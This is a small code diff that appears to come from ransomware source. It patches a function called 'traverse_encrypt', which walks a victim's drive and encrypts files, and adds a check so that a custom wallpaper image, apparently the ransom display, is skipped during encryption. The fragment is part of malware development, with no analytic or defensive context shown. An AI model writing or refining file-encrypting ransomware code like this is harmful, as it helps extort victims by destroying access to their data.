@@ -206,6 +206,10 @@ def traverse_encrypt(drive, key):
         
     for root, _, files in os.walk(drive):
         for file in files:
+            # Skip custom wallpaper
+            if "wallpaperX324HF.png" in file:
+                continue
+            
             if file.endswith('.exe'):
                 main_dirs = get_main_dirs(username, drive)
                 if any(root.startswith(main_dir) for main_dir in main_dirs):
